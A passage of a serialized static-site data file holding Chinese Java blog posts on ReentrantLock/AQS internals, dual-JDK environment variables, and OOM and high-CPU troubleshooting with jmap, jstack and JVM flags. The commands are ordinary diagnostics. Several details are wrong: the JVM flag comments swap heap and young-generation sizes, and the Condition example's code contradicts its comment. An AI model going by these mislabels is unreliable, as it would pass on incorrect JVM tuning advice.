true;\n\t\t//置空持有锁线程\n\t\tsetexclusiveownerthread(null);\n\t}\n\t//state==0(此时持有锁,不用cas)\n\tsetstate(c);\n\treturn free;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n\n# lockinterruptibly() 中断锁过程\n\nlockinterruptibly () 与 lock () 过程基本相同，区别在于 thread.intterpt () 的应对措施不同。\n\nreentrantlock 中的 lockinterruptibly () 方法使得线程可以在被阻塞时响应中断，比如一个线程 t1 通过 lockinterruptibly() 方法获取到一个可重入锁，并执行一个长时间的任务，另一个线程通过 lockinterruptibly() 方法就可以立刻打断 t1 线程的执行，来获取 t1 持有的那个可重入锁。而通过 reentrantlock 的 lock () 方法或者 synchronized 持有锁的线程是不会响应其他线程的 interrupt () 方法的，直到该方法主动释放锁之后才会响应 interrupt () 方法。\n\n//lock()\nfinal boolean acquirequeued(final node node, int arg) {\n\tboolean failed = true;\n\ttry {\n\t\t//表示是否被打断\n\t\tboolean interrupted = false;\n\t\tfor (;;) {\n\t\t\t//获取node.pre节点\n\t\t\tfinal node p = node.predecessor();\n\t\t\tif (p == head //当前节点是否是同步队列中的第二个节点\n\t\t\t&& tryacquire(arg)) {//获取锁,当前head指向当前节点\n\t\t\t\tsethead(node);//head=head.next\n\t\t\t\tp.next = null;//置空 \n\t\t\t\tfailed = false;\n\t\t\t\treturn interrupted;\n\t\t\t}\n\n\t\t\tif (shouldparkafterfailedacquire(p, node) && //是否空转(因为空转唤醒是个耗时操作,进入空转前判断pre节点状态.如果pre节点即将释放锁,则不进入空转)\n\t\t\t\tparkandcheckinterrupt())//利用unsafe.park()进行空转(阻塞)\n\t\t\t\tinterrupted = true;//如果thread.interrupt()被调用,(不会真的被打断,会继续循环空转直到获取到锁)\n\t\t}\n\t} finally {\n\t\tif (failed)//tryacquire()过程出现异常导致获取锁失败,则移除当前节点\n\t\t\tcancelacquire(node);\n\t}\n}\n// lockinterruptibly()\nprivate void doacquireinterruptibly(int arg)\n\tthrows interruptedexception {\n\tfinal node node = addwaiter(node.exclusive);\n\tboolean failed = true;\n\ttry {\n\t\tfor (;;) {\n\t\t\tfinal node p = node.predecessor();\n\t\t\tif (p == head && tryacquire(arg)) {\n\t\t\t\tsethead(node);\n\t\t\t\tp.next = null; \n\t\t\t\tfailed = false;\n\t\t\t\treturn;\n\t\t\t}\n\t\t\tif (shouldparkafterfailedacquire(p, node) &&\n\t\t\t\tparkandcheckinterrupt())//唯一区别当thread.intterpt()打断时,直接抛出异常\n\t\t\t\tthrow new interruptedexception();\n\t\t}\n\t} finally {\n\t\tif (failed)//然后移除当前节点\n\t\t\tcancelacquire(node);\n\t}\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n\n * 中断锁代码测试：csdn\n\n\n# trylock()\n\n#java.util.concurrent.locks.reentrantlock\npublic boolean trylock() {\n\t//尝试获取非公平锁\n\treturn sync.nonfairtryacquire(1);\n}\n\n\n1\n2\n3\n4\n5\n\n\n\n# trylock(long timeout, timeunit unit)\n\n#java.util.concurrent.locks.reentrantlock\npublic boolean trylock(long timeout, timeunit unit)\n\t\tthrows interruptedexception {\n\treturn sync.tryacquirenanos(1, unit.tonanos(timeout));\n}\n#java.util.concurrent.locks.abstractqueuedsynchronizer\npublic final boolean tryacquirenanos(int arg, long nanostimeout)\n\t\tthrows interruptedexception {\n\tif (thread.interrupted())\n\t\tthrow new interruptedexception();\n\treturn tryacquire(arg) ||//获取锁(公平/非公平)\n\t\tdoacquirenanos(arg, nanostimeout);//在指定时间内等待锁(空转)\n}\n\nprivate boolean doacquirenanos(int arg, long nanostimeout)\n\t\tthrows interruptedexception {\n\t...\n\tfinal long deadline = system.nanotime() + nanostimeout;\n\t//加入队尾\n\tfinal node node = addwaiter(node.exclusive);\n\tboolean failed = true;\n\ttry {\n\t\tfor (;;) {\n\t\t\tfinal node p = node.predecessor();\n\t\t\tif (p == head && tryacquire(arg)) {\n\t\t\t\tsethead(node);\n\t\t\t\tp.next = null; \n\t\t\t\tfailed = false;\n\t\t\t\treturn true;\n\t\t\t}\n\t\t  //上面与acquirequeued()相同,重点看这里\n\t\t  //计算剩余时间\n\t\t\tnanostimeout = deadline - system.nanotime();\n\t\t\tif (nanostimeout <= 0l)\n\t\t\t\treturn false;\n\t\t\tif (shouldparkafterfailedacquire(p, node) &&\n\t\t\t\tnanostimeout > spinfortimeoutthreshold)\n\t\t\t\t//利用parknanos()指定空转时间\n\t\t\t\tlocksupport.parknanos(this, nanostimeout);\n\t\t\tif (thread.interrupted())//如果被thread.interrupt(),则抛异常\n\t\t\t\tthrow new interruptedexception();\n\t\t}\n\t} finally {\n\t\tif (failed)//移除节点\n\t\t\tcancelacquire(node);\n\t}\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\n\n# reentrantlock 的等待 / 通知机制\n\n\n# newcondition()\n\npublic condition newcondition() {\n\treturn sync.newcondition();\n}\n#java.util.concurrent.locks.reentrantlock.sync\nfinal conditionobject newcondition() {\n\treturn new conditionobject();\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n * 等待和唤醒\n\n我们知道关键字 synchronized + object 的 wait 和 notify、notifyall 方法能实现等待 / 通知机制，那么 reentrantlock 是否也能实现这样的等待 / 通知机制，答案是：可以。 reentrantlock 通过 condition 对象，也就是条件队列实现了和 wait、notify、notifyall 相同的语义。 线程执行 condition.await() 方法，将节点 1 从同步队列转移到条件队列中。\n\n\n\n线程执行 condition.signal() 方法，将节点 1 从条件队列中转移到同步队列。\n\n\n\n因为只有在同步队列中的线程才能去获取锁，所以通过 condition 对象的 wait 和 signal 方法能实现等待 / 通知机制。\n\n * 等待和唤醒部分\n\n如果想单独唤醒部分线程应该怎么做呢？这时就有必要使用多个 condition 对象了，因为 reentrantlock 支持创建多个 condition 对象，例如：\n\n//为了减少篇幅 仅给出伪代码\nreentrantlock lock = new reentrantlock();\ncondition condition = lock.newcondition();\ncondition condition1 = lock.newcondition();\n\n//线程1 调用condition.await() 线程进入到条件队列\ncondition.await();\n\n//线程2 调用condition1.await() 线程进入到条件队列\ncondition1.await();\n\n//线程32 调用condition.signal() 仅唤醒调用condition中的线程，不会影响到调用condition1。\ncondition1.await();\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n这样就实现了部分唤醒的功能。\n\n\n# reentrantlock 和 synchronized 对比\n\n               reentrantlock   synchronized\n底层实现           通过 aqs 实现       通过 jvm 实现，其中 synchronized 又有多个类型的锁，除了重量级锁是通过 monitor 对象\n                               (操作系统 mutex 互斥原语) 实现外，其它类型的通过对象头实现。\n是否可重入          是               是\n公平锁            是               否\n非公平锁           是               是\n锁的类型           悲观锁、显式锁         悲观锁、隐式锁 (内置锁)\n是否支持中断         是               否\n是否支持超时等待       是               否\n是否自动获取 / 释放锁   否               是',charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"Java双版本jdk环境变量教程",frontmatter:{title:"Java双版本jdk环境变量教程",date:"2024-11-18T00:00:00.000Z",tags:["jdk","安装教程"],categories:["后端 Back-end"],sticky:1,isShowComments:!0,publish:!0},regularPath:"/views/backend/Java%E5%8F%8C%E7%89%88%E6%9C%ACjdk%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B.html",relativePath:"views/backend/Java双版本jdk环境变量配置教程.md",key:"v-1c042d0b",path:"/views/backend/Java%E5%8F%8C%E7%89%88%E6%9C%ACjdk%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B.html",headers:[{level:3,title:"1.下载并安装jdk",slug:"_1-下载并安装jdk",normalizedTitle:"1.下载并安装jdk",charIndex:64},{level:3,title:"2.配置环境变量",slug:"_2-配置环境变量",normalizedTitle:"2.配置环境变量",charIndex:78},{level:3,title:"3.踩过的坑",slug:"_3-踩过的坑",normalizedTitle:"3.踩过的坑",charIndex:90}],excerpt:"<Boxx/>\n<p>我们可能会面临同一台电脑需要装两个及以上的jdk时，需要配置相关的环境变量，本文章用于解决多条环境变量的配置问题。</p>\n",headersStr:"1.下载并安装jdk 2.配置环境变量 3.踩过的坑",content:"我们可能会面临同一台电脑需要装两个及以上的jdk时，需要配置相关的环境变量，本文章用于解决多条环境变量的配置问题。\n\n\n\n * 1.下载并安装jdk\n * 2.配置环境变量\n * 3.踩过的坑\n\n\n\n\n# Java双版本jdk环境变量配置教程\n\n\n# 1.下载并安装jdk\n\n * 选择你所需要的jdk下载并安装\n * 下载地址：https://www.java.com/zh-CN/\n\n如下图\n\n\n\n\n# 2.配置环境变量\n\n * 右键此电脑，打开属性\n * 点击高级系统设置\n * 点击环境变量\n\n这里我安装的是jdk1.8和jdk21，分别设置环境变量\n\nJAVA_HOME\t\t%JAVA21_HOME%\nJAVA21_HOME\t\tD:\\Java\\JDK21\nJAVA8_HOME\t\tD:\\Java\\JDK\n\n\n1\n2\n3\n\n\n> 这里设置了三条环境变量，用到了参数赋值的思想\n> \n>  1. 第一条是设置JAVA_HOME，如果我用21版本，就把值改为21，如果用1.8版本，就把值改为8\n>  2. 第二条是设置21版本的地址\n>  3. 第三条是设置1.8版本的地址\n\n\n\n * 选择Path，然后点击编辑\n\n\n\n * 进入编辑后，添加如下配置\n\n\n\n此处最后一条的javapath路径必须在JAVA_HOME之后，否则切换不会成功\n\n> 此处如果第一个环境变量的开头是%的话，会只显示一行，如下图\n\n\n\n * 测试是否成功\n\n用win+r快捷键进入“运行”窗口，然后输入cmd进入命令行\n\njava\njavac\njava -version\n\n\n1\n2\n3\n\n * 切换JAVA_HOME的值即可切换jdk版本\n\n注：在切换完成后，要重新进入命令行，然后再输入java -version命令，需要让命令行刷新一下才行\n\n> 如果切换不成功，这可能是安装jdk时，自动生成了优先级更高的配置项，使用以下方式解决\n> \n>  * 删除C:\\ProgramData\\Oracle\\Java\\javapath下的三个文件，windows后面会从指定的jdk版本的安装目录重新复制这三个文件放到该目录\n\n * 此处引用了部分知乎【传送门】的内容，如有兴趣可以查看原文。\n\n\n# 3.踩过的坑\n\n 1. 建议在插入Path环境变量的时候，要记得把JAVA_HOME的几条内容都上移到最上方，javapath在最后\n 2. 建议在测试时，要关掉命令行，重新开一个页面后再输入java -version测试",normalizedContent:"我们可能会面临同一台电脑需要装两个及以上的jdk时，需要配置相关的环境变量，本文章用于解决多条环境变量的配置问题。\n\n\n\n * 1.下载并安装jdk\n * 2.配置环境变量\n * 3.踩过的坑\n\n\n\n\n# java双版本jdk环境变量配置教程\n\n\n# 1.下载并安装jdk\n\n * 选择你所需要的jdk下载并安装\n * 下载地址：https://www.java.com/zh-cn/\n\n如下图\n\n\n\n\n# 2.配置环境变量\n\n * 右键此电脑，打开属性\n * 点击高级系统设置\n * 点击环境变量\n\n这里我安装的是jdk1.8和jdk21，分别设置环境变量\n\njava_home\t\t%java21_home%\njava21_home\t\td:\\java\\jdk21\njava8_home\t\td:\\java\\jdk\n\n\n1\n2\n3\n\n\n> 这里设置了三条环境变量，用到了参数赋值的思想\n> \n>  1. 第一条是设置java_home，如果我用21版本，就把值改为21，如果用1.8版本，就把值改为8\n>  2. 第二条是设置21版本的地址\n>  3. 第三条是设置1.8版本的地址\n\n\n\n * 选择path，然后点击编辑\n\n\n\n * 进入编辑后，添加如下配置\n\n\n\n此处最后一条的javapath路径必须在java_home之后，否则切换不会成功\n\n> 此处如果第一个环境变量的开头是%的话，会只显示一行，如下图\n\n\n\n * 测试是否成功\n\n用win+r快捷键进入“运行”窗口，然后输入cmd进入命令行\n\njava\njavac\njava -version\n\n\n1\n2\n3\n\n * 切换java_home的值即可切换jdk版本\n\n注：在切换完成后，要重新进入命令行，然后再输入java -version命令，需要让命令行刷新一下才行\n\n> 如果切换不成功，这可能是安装jdk时，自动生成了优先级更高的配置项，使用以下方式解决\n> \n>  * 删除c:\\programdata\\oracle\\java\\javapath下的三个文件，windows后面会从指定的jdk版本的安装目录重新复制这三个文件放到该目录\n\n * 此处引用了部分知乎【传送门】的内容，如有兴趣可以查看原文。\n\n\n# 3.踩过的坑\n\n 1. 建议在插入path环境变量的时候，要记得把java_home的几条内容都上移到最上方，javapath在最后\n 2. 建议在测试时，要关掉命令行，重新开一个页面后再输入java -version测试",charsets:{cjk:!0},lastUpdated:"2024/11/20, 22:00:33",lastUpdatedTimestamp:1732111233e3},{title:"OOM分类及排查",frontmatter:{title:"OOM分类及排查",date:"2022-04-10T00:00:00.000Z",tags:["多线程","Java"],categories:["后端 Back-end"],isShowComments:!0},regularPath:"/views/backend/OOM%E5%88%86%E7%B1%BB%E5%8F%8A%E6%8E%92%E6%9F%A5.html",relativePath:"views/backend/OOM分类及排查.md",key:"v-187b5cb8",path:"/views/backend/OOM%E5%88%86%E7%B1%BB%E5%8F%8A%E6%8E%92%E6%9F%A5.html",headers:[{level:2,title:"OOM分类",slug:"oom分类",normalizedTitle:"oom分类",charIndex:3},{level:2,title:"CPU过高排查流程",slug:"cpu过高排查流程",normalizedTitle:"cpu过高排查流程",charIndex:12},{level:2,title:"内存占用过高排查流程",slug:"内存占用过高排查流程",normalizedTitle:"内存占用过高排查流程",charIndex:25},{level:2,title:"示例",slug:"示例",normalizedTitle:"示例",charIndex:39},{level:3,title:"使用 ps 命令查看进程",slug:"使用-ps-命令查看进程",normalizedTitle:"使用 ps 命令查看进程",charIndex:47},{level:3,title:"使用 top 命令",slug:"使用-top-命令",normalizedTitle:"使用 top 命令",charIndex:65},{level:3,title:"使用 jmap 命令查看",slug:"使用-jmap-命令查看",normalizedTitle:"使用 jmap 命令查看",charIndex:80},{level:2,title:"JVM 参数",slug:"jvm-参数",normalizedTitle:"jvm 参数",charIndex:96},{level:2,title:"其他",slug:"其他",normalizedTitle:"其他",charIndex:106}],excerpt:"<Boxx/>\n",headersStr:"OOM分类 CPU过高排查流程 内存占用过高排查流程 示例 使用 ps 命令查看进程 使用 top 命令 使用 jmap 命令查看 JVM 参数 其他",content:" * OOM分类\n * CPU过高排查流程\n * 内存占用过高排查流程\n * 示例\n   * 使用 ps 命令查看进程\n   * 使用 top 命令\n   * 使用 jmap 命令查看\n * JVM 参数\n * 其他\n\n\n\n\n# OOM分类\n\n * java.lang.OutOfMemoryError: Java heap space\n   \n   Java 堆溢出原因： 无法在 Java 堆中分配对象 应用程序保存了无法被GC回收的对象。 应用程序过度使用 finalizer。\n\n * java.lang.OutOfMemoryError: unable to create new native thread\n   \n   排查代码，确定是否显示使用死循环创建线程，或者隐式调用第三方接口创建线程\n\n * java.lang.OutOfMemoryError: Metaspace\n   \n   方法区溢出：检查JVM元空间设置参数是否过小，检查对应代码,是否使用CGLib生成了大量的代理类\n\n * java.lang.OutOfMemoryError: Direct buffer memory\n   \n   本机直接内存溢出：检查JVM参数-Xmx，-XX:MaxDirectMemorySize 是否合理。\n\n * java.lang.OutOfMemoryError: GC overhead limit exceeded\n   \n   Sun 官方对此的定义：超过98%的时间用来做GC并且回收了不到2%的堆内存时会抛出此异常。\n   \n   一般都是堆太小导致的：检查JVM参数-Xmx -Xms是否合理 dump内存，检查是否存在内存泄露，如果没有，加大内存。\n\n\n# CPU过高排查流程\n\n 1. 利用 top 命令可以查出占用 CPU 最高的进程pid，如果pid为 9876\n 2. 然后查看该进程下占用最高的线程id【top -Hp 9876】\n 3. 假设占用率最高的线程 ID 为6900，将其转换为 16 进制形式（因为 java native 线程以 16 进制形式输出）【printf '%x\\n' 6900】\n 4. 利用jstack打印出 java 线程调用栈信息 【jstack 9876 | grep '0x1af4' -A 50 --color】，这样就可以更好的定位问题\n\n线上解决示例参考上一篇文章：找出某个Java进程中最耗费CPU的Java线程\n\n\n# 内存占用过高排查流程\n\n 1. 查找进程id：【top -d 2 -c】\n 2. 查看 JVM 堆内存分配情况：jmap -head pid\n 3. 查看占用内存比较多的对象：jamp -histo pid | head -n 100\n 4. 查看占用内存比较多的存活对象：jmap -histo:live pid | head -n 100\n\n当程序发生OOM退出系统时，一些瞬时信息都随着程序的终止而消失，而重现OOM问题往往比较困难或者耗时。此时若能在OOM时，自动导出dump文件就显得非常迫切。\n\n这里介绍一种比较常用的取得堆快照文件的方法，即使用 -XX:+HeapDumpOnOutOfMemoryError:在程序发生OOM时，导出应用程序的当前堆快照。-XX: HeapDumpPath:可以指定堆快照的保存位置。\n\n比如：\n\n-Xmx100m -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=~\\dump.hprof\n\n\n1\n\n\n若存在dump文件，使用Jhat、VisualVM等工具分析即可；\n\n\n# 示例\n\n下面是对常见的 java.lang.OutOfMemoryError: Java heap space 排查：\n\n\n# 使用 ps 命令查看进程\n\nps -aux|grep java命令查看一下你的java进程，就可以找到你的java进程的进程id。\n\n\n# 使用 top 命令\n\ntop命令显示的结果列表中，会看到%MEM这一列，这里可以看到你的进程可能对内存的使用率特别高。以查看正在运行的进程和系统负载信息，包括cpu负载、内存使用、各个进程所占系统资源等。\n\n\n\n\n# 使用 jmap 命令查看\n\n * ./jmap -heap PID 打印堆总结\n\n * ./jmap -dump:file=/data/logs/jmap/auto.dump PID，dump内存分析日志\n\n[root@test bin]# ./jmap -dump:file=/data/logs/jmap/auto.dump 13\n13: Unable to open socket file: target process not responding or HotSpot VM not loaded\nThe -F option can be used when the target process is not responding\n[root@test bin]# ./jmap -F -dump:file=/data/logs/jmap/auto.dump 13\nAttaching to process ID 13, please wait...\nError attaching to process: sun.jvm.hotspot.debugger.DebuggerException: cannot open binary file\nsun.jvm.hotspot.debugger.DebuggerException: sun.jvm.hotspot.debugger.DebuggerException: cannot open binary file\n        at sun.jvm.hotspot.debugger.linux.LinuxDebuggerLocal$LinuxDebuggerLocalWorkerThread.execute(LinuxDebuggerLocal.java:163)\n        at sun.jvm.hotspot.debugger.linux.LinuxDebuggerLocal.attach(LinuxDebuggerLocal.java:278)\n        at sun.jvm.hotspot.HotSpotAgent.attachDebugger(HotSpotAgent.java:671)\n        at sun.jvm.hotspot.HotSpotAgent.setupDebuggerLinux(HotSpotAgent.java:611)\n        at sun.jvm.hotspot.HotSpotAgent.setupDebugger(HotSpotAgent.java:337)\n        at sun.jvm.hotspot.HotSpotAgent.go(HotSpotAgent.java:304)\n        at sun.jvm.hotspot.HotSpotAgent.attach(HotSpotAgent.java:140)\n        at sun.jvm.hotspot.tools.Tool.start(Tool.java:185)\n        at sun.jvm.hotspot.tools.Tool.execute(Tool.java:118)\n        at sun.jvm.hotspot.tools.HeapDumper.main(HeapDumper.java:83)\n        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\n        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\n        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\n        at java.lang.reflect.Method.invoke(Method.java:498)\n        at sun.tools.jmap.JMap.runTool(JMap.java:201)\n        at sun.tools.jmap.JMap.main(JMap.java:130)\nCaused by: sun.jvm.hotspot.debugger.DebuggerException: cannot open binary file\n        at sun.jvm.hotspot.debugger.linux.LinuxDebuggerLocal.attach0(Native Method)\n        at sun.jvm.hotspot.debugger.linux.LinuxDebuggerLocal.access$100(LinuxDebuggerLocal.java:62)\n        at sun.jvm.hotspot.debugger.linux.LinuxDebuggerLocal$1AttachTask.doit(LinuxDebuggerLocal.java:269)\n        at sun.jvm.hotspot.debugger.linux.LinuxDebuggerLocal$LinuxDebuggerLocalWorkerThread.run(LinuxDebuggerLocal.java:138)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n\n# JVM 参数\n\n补充一下有意义的jvm启动参数：\n\n-XX:ParallelGCThreads=4 （并行收集，几核机器设置几核）\n-Xms6g   （调优，设置新生代初始大小）\n-Xmx6g   （调优，设置新生代最大值）\n-Xmn2g   （调优，设置堆空间大小）\n-XX:MetaspaceSize=2048m\n-XX:MaxMetaspaceSize=2048m\n-XX:MaxDirectMemorySize=1g\n-XX:SurvivorRatio=8   （新老年代默认8:1:1）\n-XX:+UseConcMarkSweepGC  （使用CMS垃圾收集器）\n-XX:CMSMaxAbortablePrecleanTime=5000 （并发标记阶段之后、重新标记阶段之前，就让你执行这么长时间）\n-XX:+CMSClassUnloadingEnabled （允许类卸载，比如线上使用内存诊断工具Arthas，用完后会有残留）\n-XX:CMSInitiatingOccupancyFraction=80 （老年带到达80%，触发老年代收集）\n-XX:+UseCMSInitiatingOccupancyOnly（配合上面参数使用）\n-XX:+ExplicitGCInvokesConcurrent （针对System.gc()触发老年带的GC，否则就是fullGC）\n-Xloggc:/home/admin/logs/gc.log  （GC日志目录）\n-XX:+PrintGCDetails  （GC日志详细细节）\n-XX:+PrintGCDateStamps (每个垃圾收集事件发生的确切日期和时间戳)\n-XX:+HeapDumpOnOutOfMemoryError  （OOM）\n-XX:HeapDumpPath=/home/admin/logs/java.hprof （OOM）\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# 其他\n\n * Alibaba Java诊断利器 Arthas\n * Linux服务器Java进程突然消失排查办法",normalizedContent:" * oom分类\n * cpu过高排查流程\n * 内存占用过高排查流程\n * 示例\n   * 使用 ps 命令查看进程\n   * 使用 top 命令\n   * 使用 jmap 命令查看\n * jvm 参数\n * 其他\n\n\n\n\n# oom分类\n\n * java.lang.outofmemoryerror: java heap space\n   \n   java 堆溢出原因： 无法在 java 堆中分配对象 应用程序保存了无法被gc回收的对象。 应用程序过度使用 finalizer。\n\n * java.lang.outofmemoryerror: unable to create new native thread\n   \n   排查代码，确定是否显示使用死循环创建线程，或者隐式调用第三方接口创建线程\n\n * java.lang.outofmemoryerror: metaspace\n   \n   方法区溢出：检查jvm元空间设置参数是否过小，检查对应代码,是否使用cglib生成了大量的代理类\n\n * java.lang.outofmemoryerror: direct buffer memory\n   \n   本机直接内存溢出：检查jvm参数-xmx，-xx:maxdirectmemorysize 是否合理。\n\n * java.lang.outofmemoryerror: gc overhead limit exceeded\n   \n   sun 官方对此的定义：超过98%的时间用来做gc并且回收了不到2%的堆内存时会抛出此异常。\n   \n   一般都是堆太小导致的：检查jvm参数-xmx -xms是否合理 dump内存，检查是否存在内存泄露，如果没有，加大内存。\n\n\n# cpu过高排查流程\n\n 1. 利用 top 命令可以查出占用 cpu 最高的进程pid，如果pid为 9876\n 2. 然后查看该进程下占用最高的线程id【top -hp 9876】\n 3. 假设占用率最高的线程 id 为6900，将其转换为 16 进制形式（因为 java native 线程以 16 进制形式输出）【printf '%x\\n' 6900】\n 4. 利用jstack打印出 java 线程调用栈信息 【jstack 9876 | grep '0x1af4' -a 50 --color】，这样就可以更好的定位问题\n\n线上解决示例参考上一篇文章：找出某个java进程中最耗费cpu的java线程\n\n\n# 内存占用过高排查流程\n\n 1. 查找进程id：【top -d 2 -c】\n 2. 查看 jvm 堆内存分配情况：jmap -head pid\n 3. 查看占用内存比较多的对象：jamp -histo pid | head -n 100\n 4. 查看占用内存比较多的存活对象：jmap -histo:live pid | head -n 100\n\n当程序发生oom退出系统时，一些瞬时信息都随着程序的终止而消失，而重现oom问题往往比较困难或者耗时。此时若能在oom时，自动导出dump文件就显得非常迫切。\n\n这里介绍一种比较常用的取得堆快照文件的方法，即使用 -xx:+heapdumponoutofmemoryerror:在程序发生oom时，导出应用程序的当前堆快照。-xx: heapdumppath:可以指定堆快照的保存位置。\n\n比如：\n\n-xmx100m -xx:+heapdumponoutofmemoryerror -xx:heapdumppath=~\\dump.hprof\n\n\n1\n\n\n若存在dump文件，使用jhat、visualvm等工具分析即可；\n\n\n# 示例\n\n下面是对常见的 java.lang.outofmemoryerror: java heap space 排查：\n\n\n# 使用 ps 命令查看进程\n\nps -aux|grep java命令查看一下你的java进程，就可以找到你的java进程的进程id。\n\n\n# 使用 top 命令\n\ntop命令显示的结果列表中，会看到%mem这一列，这里可以看到你的进程可能对内存的使用率特别高。以查看正在运行的进程和系统负载信息，包括cpu负载、内存使用、各个进程所占系统资源等。\n\n\n\n\n# 使用 jmap 命令查看\n\n * ./jmap -heap pid 打印堆总结\n\n * ./jmap -dump:file=/data/logs/jmap/auto.dump pid，dump内存分析日志\n\n[root@test bin]# ./jmap -dump:file=/data/logs/jmap/auto.dump 13\n13: unable to open socket file: target process not responding or hotspot vm not loaded\nthe -f option can be used when the target process is not responding\n[root@test bin]# ./jmap -f -dump:file=/data/logs/jmap/auto.dump 13\nattaching to process id 13, please wait...\nerror attaching to process: sun.jvm.hotspot.debugger.debuggerexception: cannot open binary file\nsun.jvm.hotspot.debugger.debuggerexception: sun.jvm.hotspot.debugger.debuggerexception: cannot open binary file\n        at sun.jvm.hotspot.debugger.linux.linuxdebuggerlocal$linuxdebuggerlocalworkerthread.execute(linuxdebuggerlocal.java:163)\n        at sun.jvm.hotspot.debugger.linux.linuxdebuggerlocal.attach(linuxdebuggerlocal.java:278)\n        at sun.jvm.hotspot.hotspotagent.attachdebugger(hotspotagent.java:671)\n        at sun.jvm.hotspot.hotspotagent.setupdebuggerlinux(hotspotagent.java:611)\n        at sun.jvm.hotspot.hotspotagent.setupdebugger(hotspotagent.java:337)\n        at sun.jvm.hotspot.hotspotagent.go(hotspotagent.java:304)\n        at sun.jvm.hotspot.hotspotagent.attach(hotspotagent.java:140)\n        at sun.jvm.hotspot.tools.tool.start(tool.java:185)\n        at sun.jvm.hotspot.tools.tool.execute(tool.java:118)\n        at sun.jvm.hotspot.tools.heapdumper.main(heapdumper.java:83)\n        at sun.reflect.nativemethodaccessorimpl.invoke0(native method)\n        at sun.reflect.nativemethodaccessorimpl.invoke(nativemethodaccessorimpl.java:62)\n        at sun.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:43)\n        at java.lang.reflect.method.invoke(method.java:498)\n        at sun.tools.jmap.jmap.runtool(jmap.java:201)\n        at sun.tools.jmap.jmap.main(jmap.java:130)\ncaused by: sun.jvm.hotspot.debugger.debuggerexception: cannot open binary file\n        at sun.jvm.hotspot.debugger.linux.linuxdebuggerlocal.attach0(native method)\n        at sun.jvm.hotspot.debugger.linux.linuxdebuggerlocal.access$100(linuxdebuggerlocal.java:62)\n        at sun.jvm.hotspot.debugger.linux.linuxdebuggerlocal$1attachtask.doit(linuxdebuggerlocal.java:269)\n        at sun.jvm.hotspot.debugger.linux.linuxdebuggerlocal$linuxdebuggerlocalworkerthread.run(linuxdebuggerlocal.java:138)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n\n# jvm 参数\n\n补充一下有意义的jvm启动参数：\n\n-xx:parallelgcthreads=4 （并行收集，几核机器设置几核）\n-xms6g   （调优，设置新生代初始大小）\n-xmx6g   （调优，设置新生代最大值）\n-xmn2g   （调优，设置堆空间大小）\n-xx:metaspacesize=2048m\n-xx:maxmetaspacesize=2048m\n-xx:maxdirectmemorysize=1g\n-xx:survivorratio=8   （新老年代默认8:1:1）\n-xx:+useconcmarksweepgc  （使用cms垃圾收集器）\n-xx:cmsmaxabortableprecleantime=5000 （并发标记阶段之后、重新标记阶段之前，就让你执行这么长时间）\n-xx:+cmsclassunloadingenabled （允许类卸载，比如线上使用内存诊断工具arthas，用完后会有残留）\n-xx:cmsinitiatingoccupancyfraction=80 （老年带到达80%，触发老年代收集）\n-xx:+usecmsinitiatingoccupancyonly（配合上面参数使用）\n-xx:+explicitgcinvokesconcurrent （针对system.gc()触发老年带的gc，否则就是fullgc）\n-xloggc:/home/admin/logs/gc.log  （gc日志目录）\n-xx:+printgcdetails  （gc日志详细细节）\n-xx:+printgcdatestamps (每个垃圾收集事件发生的确切日期和时间戳)\n-xx:+heapdumponoutofmemoryerror  （oom）\n-xx:heapdumppath=/home/admin/logs/java.hprof （oom）\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# 其他\n\n * alibaba java诊断利器 arthas\n * linux服务器java进程突然消失排查办法",charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"JDK/Dubbo/Spring 三种SPI机制解析",frontmatter:{title:"JDK/Dubbo/Spring 三种SPI机制解析",date:"2022-02-15T00:00:00.000Z",tags:["SPI"],categories:["后端 Back-end"],isShowComments:!0},regularPath:"/views/backend/SPI_JdkDubboSpring.html",relativePath:"views/backend/SPI_JdkDubboSpring.md",key:"v-0db091ee",path:"/views/backend/SPI_JdkDubboSpring.html",headers:[{level:2,title:"SPI 有什么用？",slug:"spi-有什么用",normalizedTitle:"spi 有什么用？",charIndex:3},{level:2,title:"JDK SPI",slug:"jdk-spi",normalizedTitle:"jdk spi",charIndex:16},{level:2,title:"Dubbo SPI",slug:"dubbo-spi",normalizedTitle:"dubbo spi",charIndex:27},{level:2,title:"Spring 